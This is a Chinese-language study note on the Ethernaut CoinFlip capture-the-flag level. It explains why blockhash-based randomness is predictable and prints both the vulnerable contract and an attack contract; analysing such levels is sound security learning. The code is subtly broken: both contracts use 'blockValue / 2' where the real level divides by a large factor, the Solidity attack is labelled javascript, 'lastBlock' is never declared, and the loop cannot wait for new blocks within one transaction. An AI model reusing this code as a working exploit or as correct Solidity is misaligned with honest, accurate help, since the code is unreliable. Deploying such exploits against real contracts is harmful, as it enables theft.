**踩坑记录**：区块链上的随机数很难。最初以为用 `block.number` 就够了，结果看了 Writeup 才知道这是确定性环境。

**核心漏洞**：`blockhash()` 可被预测

```solidity
// 有问题的合约代码
contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    
    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        
        if (lastHash == blockValue) {
            revert();
        }
        
        lastHash = blockValue;
        uint256 coinFlip = blockValue / 2;
        bool side = coinFlip == 1 ? true : false;
        
        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

**攻击思路**（来源：Ethernaut 官方解答）：
由于 `block.number - 1` 的哈希在交易打包时已知，我们可以部署攻击合约提前计算：

```javascript
// 攻击合约（需部署到相同区块）
contract CoinFlipHack {
    CoinFlip public victim;
    uint256 public consecutiveWins;
    
    constructor(address _victim) {
        victim = CoinFlip(_victim);
    }
    
    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 2;
        bool guess = coinFlip == 1 ? true : false;
        
        victim.flip(guess);
    }
    
    // 必须每个区块调用一次，因为 blockhash 只在当前区块有效
    function attackInLoop() public {
        for (uint i = 0; i < 10; i++) {
            // 需要等待新区块
            require(block.number > lastBlock, "Wait for new block");
            attack();
            lastBlock = block.number;
        }
    }
}
```

**成功条件**：连续赢 10 次

**总结**：区块链是"确定性"的，任何依赖链上数据（blockhash、timestamp）的"随机数"都是伪随机。实际项目中应该用 Chainlink VRF 或 commit-reveal 方案。